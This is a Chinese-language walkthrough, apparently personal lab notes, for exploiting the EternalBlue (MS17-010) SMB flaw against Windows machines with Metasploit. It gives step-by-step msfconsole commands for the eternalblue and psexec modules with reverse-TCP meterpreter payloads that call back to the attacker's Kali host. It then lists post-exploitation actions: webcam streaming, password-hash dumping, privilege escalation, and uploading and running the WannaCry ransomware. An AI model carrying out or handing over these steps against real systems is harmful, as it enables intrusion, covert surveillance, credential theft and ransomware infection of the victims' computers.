# 永恒之蓝-漏洞利用
## 环境
宿主机:	192.168.43.152 \
kali:	192.168.43.1 \
win32:	192.168.43.3（防火墙允许文件与打印机共享) \
win64:	192.168.19.2（防火墙允许文件与打印机共享)

## 主机发现
`nmap -n -p445 --script smb-vuln-ms17-010 192.168.19.154 --open` \
也可以用 \
`nmap -n -p445 192.168.43.2` \
`>nmap ms17-010` 定向扫描,发现端口开放并存在ms17-010 漏洞

## 使用msf框架攻击win64
`msfconsole` \
进入msf> \
`version` \
确保MS \
架版本在 4.14.17以上,否则请apt-get install,search search ms17_010 \
漏洞模块路径查询，搜索到了 4 个相关的插件： \
`auxiliary/admin/smb/ms17_010_command` \
`auxiliary/scanner/smb/smb_ms17_010` \
`exploit/windows/smb/ms17_010_eternalblue` \
`exploit/windows/smb/ms17_010_psexec` \
其中前2个插件是auxiliary下的，属于辅助验证程序,用来扫描的。3和4是exploit下的,用来攻击。 \
注意到,msf的模块目录是在/usr/share/metasploit-framework/modules \
`use exploit/windows/smb/ms17_010_eternalblue`   /调用攻击模块 \
`options` \
查看参数,并设置： \
`set RHOST 192.168.43.2` \
设定攻击目标  \
`show payloads` \
查看详细信息 \
`set payload windows/x64/meterpreter/reverse_tcp` \
配置攻击载荷  \
`set LHOST 192.168.43.1` \
设置操作机地址,即kali本机地址 \
`exploit` \
发起攻击,也可以用`run`。出现win -success!就成功了。

## 可以试试以下操作，或者help
`getuid，sysinfo` \
查看系统信息 \
`webcam_list` \
看看被控制的电脑有没有摄像头,如果有用webcam_stream命令可以打开摄像头监控 \
`route` \
查看路由表 \
`screenshot` \
桌面截图，很卡 \
`shell` \
打开命令行，然后可以ipconfig/whoami/net user \
`ps` \
看看开了哪些杀毒软件，内网一致 \
`kill` \
`hashdump` \
`getsystem` \
提权 \
`upload wcry/wcry.ext c:\` \
`upload wcry/FILE_ID.DIZ c:\` \
`execute -f c:\wcry.exe` \
上传和执行勒索病毒

## 使用msf框架攻击win32
`use exploit/windows/smb/ms17_010_psexec` \
`set RHOST 192.168.43.3` \
`set payload windows/meterpreter/reverse_tcp` \
`show options` \
查看设置好的参数 \
`set LHOST 192.168.43.1` \
`set SMBUser aleecy` \
32位机的账号 \
`set SMBPass 0` \
32位机的密码 \
`exploit`


## 更多参考：
http://www.sqlsec.com/2018/03/smb.html \
https://blog.csdn.net/zmeixuan/article/details/77587370 \
http://www.freebuf.com/articles/system/132274.html

## 清理重载msf：
`/etc/init.d/postgresql restart` \
`reload_all`
